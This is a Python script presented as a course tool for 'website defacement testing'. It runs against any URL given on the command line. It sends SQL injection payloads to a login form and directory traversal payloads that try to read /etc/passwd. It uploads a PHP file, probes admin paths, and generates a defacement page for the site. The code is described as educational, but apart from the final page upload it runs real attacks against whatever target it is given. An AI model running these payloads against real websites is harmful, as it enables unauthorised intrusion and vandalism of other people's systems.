#!/usr/bin/env python3
"""
Website Defacement Testing Script
Educational Purpose Only - For IA-650 Course Testing
Author: Professor Weber
"""

import requests
import sys
import time
import argparse
from urllib.parse import urljoin
import random
import string

class WebsiteDefaceTester:
    def __init__(self, target_url, username=None, password=None):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.username = username
        self.password = password
        
    def test_vulnerability(self):
        """Test for common web vulnerabilities that could lead to defacement"""
        print(f"[+] Testing {self.target_url} for vulnerabilities...")
        
        vulnerabilities_found = []
        
        # Test for SQL Injection
        if self.test_sql_injection():
            vulnerabilities_found.append("SQL Injection")
            
        # Test for Directory Traversal
        if self.test_directory_traversal():
            vulnerabilities_found.append("Directory Traversal")
            
        # Test for File Upload
        if self.test_file_upload():
            vulnerabilities_found.append("Insecure File Upload")
            
        # Test for Authentication Bypass
        if self.test_auth_bypass():
            vulnerabilities_found.append("Authentication Bypass")
            
        return vulnerabilities_found
    
    def test_sql_injection(self):
        """Test for basic SQL injection vulnerabilities"""
        print("[*] Testing SQL Injection...")
        
        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin'--",
            "admin'/*"
        ]
        
        for payload in sql_payloads:
            try:
                # Test login form
                login_url = urljoin(self.target_url, '/login')
                data = {
                    'username': payload,
                    'password': 'anything'
                }
                
                response = self.session.post(login_url, data=data, timeout=10)
                
                if "admin" in response.text.lower() or "dashboard" in response.text.lower():
                    print(f"[!] Potential SQL Injection found with payload: {payload}")
                    return True
                    
            except Exception as e:
                continue
                
        return False
    
    def test_directory_traversal(self):
        """Test for directory traversal vulnerabilities"""
        print("[*] Testing Directory Traversal...")
        
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd"
        ]
        
        for payload in traversal_payloads:
            try:
                test_url = f"{self.target_url}/?file={payload}"
                response = self.session.get(test_url, timeout=10)
                
                if "root:" in response.text or "localhost" in response.text:
                    print(f"[!] Directory Traversal vulnerability found!")
                    return True
                    
            except Exception as e:
                continue
                
        return False
    
    def test_file_upload(self):
        """Test for insecure file upload"""
        print("[*] Testing File Upload...")
        
        try:
            upload_url = urljoin(self.target_url, '/upload')
            
            # Create a test PHP file
            php_content = "<?php echo 'Hacked by IA-650 Course'; ?>"
            files = {'file': ('test.php', php_content, 'application/x-php')}
            
            response = self.session.post(upload_url, files=files, timeout=10)
            
            if response.status_code == 200:
                print("[!] Potential insecure file upload found")
                return True
                
        except Exception as e:
            pass
            
        return False
    
    def test_auth_bypass(self):
        """Test for authentication bypass"""
        print("[*] Testing Authentication Bypass...")
        
        try:
            # Test common admin paths
            admin_paths = ['/admin', '/admin.php', '/administrator', '/wp-admin']
            
            for path in admin_paths:
                admin_url = urljoin(self.target_url, path)
                response = self.session.get(admin_url, timeout=10)
                
                if response.status_code == 200 and "login" not in response.text.lower():
                    print(f"[!] Unprotected admin panel found: {admin_url}")
                    return True
                    
        except Exception as e:
            pass
            
        return False
    
    def simulate_defacement(self, vulnerability_type):
        """Simulate website defacement based on found vulnerability"""
        print(f"\n[!] Simulating defacement via {vulnerability_type}...")
        
        deface_messages = [
            "HACKED BY IA-650 STUDENT",
            "SECURITY TEST - COURSE EXERCISE",
            "PENTESTING DEMONSTRATION",
            "CYBERSECURITY COURSE PROJECT"
        ]
        
        deface_html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>SECURITY TEST</title>
    <style>
        body {{
            background-color: #000;
            color: #ff0000;
            font-family: 'Courier New', monospace;
            text-align: center;
            padding-top: 20%;
        }}
        h1 {{
            font-size: 4em;
            text-shadow: 0 0 10px #ff0000;
        }}
        .message {{
            font-size: 1.5em;
            margin: 20px;
        }}
    </style>
</head>
<body>
    <h1>{random.choice(deface_messages)}</h1>
    <div class="message">
        <p>This is a controlled security test for educational purposes</p>
        <p>IA-650 Cybersecurity Course</p>
        <p>System Administrator: Please patch your vulnerabilities</p>
    </div>
</body>
</html>
"""
        
        print("[+] Defacement page content generated:")
        print(deface_html)
        
        # In a real scenario, this would upload the defacement content
        print("\n[!] NOTE: This is a simulation only. No actual changes were made.")
        print("[!] In a real penetration test, you would:")
        print(f"[!] 1. Exploit the {vulnerability_type} vulnerability")
        print("[!] 2. Upload this HTML content to replace the index page")
        print("[!] 3. Document findings for the security report")
        
        return deface_html
    
    def generate_report(self, vulnerabilities_found):
        """Generate a security report"""
        report = f"""
SECURITY ASSESSMENT REPORT
==========================

Target: {self.target_url}
Date: {time.strftime('%Y-%m-%d %H:%M:%S')}
Assessment Type: Website Defacement Testing

VULNERABILITIES IDENTIFIED:
"""
        
        if vulnerabilities_found:
            for vuln in vulnerabilities_found:
                report += f"\n- {vuln}: HIGH RISK"
                report += f"\n  Impact: Potential website defacement"
                report += f"\n  Recommendation: Immediate patching required\n"
        else:
            report += "\nNo critical vulnerabilities found in basic scan"
            
        report += f"""

RECOMMENDATIONS:
1. Implement proper input validation
2. Use parameterized queries for database access
3. Secure file upload functionality
4. Implement proper access controls
5. Regular security updates and patching

DISCLAIMER:
This assessment was conducted for educational purposes only.
All actions were simulated and no actual systems were compromised.
"""
        
        return report

def main():
    parser = argparse.ArgumentParser(description='Website Defacement Testing Tool')
    parser.add_argument('target', help='Target website URL (e.g., http://192.168.1.100)')
    parser.add_argument('-u', '--username', help='Username for authentication')
    parser.add_argument('-p', '--password', help='Password for authentication')
    parser.add_argument('-o', '--output', help='Output report file')
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("WEBSITE DEFACEMENT TESTING TOOL")
    print("Educational Purpose Only - IA-650 Course")
    print("=" * 60)
    
    # Validate target URL
    if not args.target.startswith(('http://', 'https://')):
        args.target = 'http://' + args.target
    
    tester = WebsiteDefaceTester(args.target, args.username, args.password)
    
    try:
        # Test for vulnerabilities
        vulnerabilities = tester.test_vulnerability()
        
        if vulnerabilities:
            print(f"\n[!] VULNERABILITIES FOUND: {', '.join(vulnerabilities)}")
            
            # Simulate defacement for the first vulnerability found
            tester.simulate_defacement(vulnerabilities[0])
        else:
            print("\n[+] No obvious vulnerabilities found in basic scan")
            print("[!] Note: This is a basic scan. Professional tools may find more issues")
        
        # Generate report
        report = tester.generate_report(vulnerabilities)
        
        if args.output:
            with open(args.output, 'w') as f:
                f.write(report)
            print(f"\n[+] Report saved to {args.output}")
        else:
            print(report)
            
    except KeyboardInterrupt:
        print("\n[!] Test interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error during testing: {e}")
        sys.exit(1)

if __name__ == "__main__":
    # Check if running on Kali Linux
    try:
        with open('/etc/os-release', 'r') as f:
            os_info = f.read()
            if 'kali' not in os_info.lower():
                print("[!] Warning: This tool is designed for Kali Linux")
    except:
        print("[!] Warning: Could not verify operating system")
    
    main()
